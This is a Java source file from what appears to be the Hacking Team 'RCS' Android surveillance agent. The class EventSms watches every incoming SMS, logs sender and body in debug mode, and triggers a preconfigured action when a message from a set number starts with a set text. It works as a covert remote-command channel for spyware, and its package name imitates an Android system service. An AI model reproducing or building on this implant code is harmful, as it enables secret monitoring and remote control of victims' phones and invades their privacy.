/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventSms.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import com.android.service.Sms;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerSms;
import com.android.service.util.Check;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

public class EventSms extends EventBase implements Observer<Sms> {
	/** The Constant TAG. */
	private static final String TAG = "EventSms";

	private int actionOnEnter;
	private String number, msg;
	
	@Override
	public void begin() {
		ListenerSms.self().attach(this);
	}

	@Override
	public void end() {
		ListenerSms.self().detach(this);
	}

	@Override
	public boolean parse(EventConf event) {
		super.setEvent(event);

		final byte[] conf = event.getParams();

		final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
		
		try {
			actionOnEnter = event.getAction();

			// Estraiamo il numero di telefono
			byte[] num = new byte[databuffer.readInt()];
			databuffer.read(num);

			number = WChar.getString(num, true);
			
			// Estraiamo il messaggio atteso
			byte[] text = new byte[databuffer.readInt()];
			databuffer.read(text);
			
			msg = WChar.getString(text, true);
			
			num = text = null;
		} catch (final IOException e) {
			if(Cfg.DEBUG) Check.log( TAG + " Error: params FAILED");
			return false;
		}
		
		return true;
	}

	@Override
	public void go() {
		// TODO Auto-generated method stub
	}

	// Viene richiamata dal listener (dalla dispatch())
	public int notification(Sms s) {
		if(Cfg.DEBUG) Check.log( TAG + " Got SMS notification from: " + s.getAddress() + " Body: " + s.getBody());
		
		if (s.getAddress().equalsIgnoreCase(this.number) == false) {
			return 0;
		}
		
		// Case sensitive
		if (s.getBody().startsWith(this.msg) == false) {
			return 0;
		}
		
		onEnter();
		return 1;
	}
	
	public void onEnter() {
		trigger(actionOnEnter);
	}
}
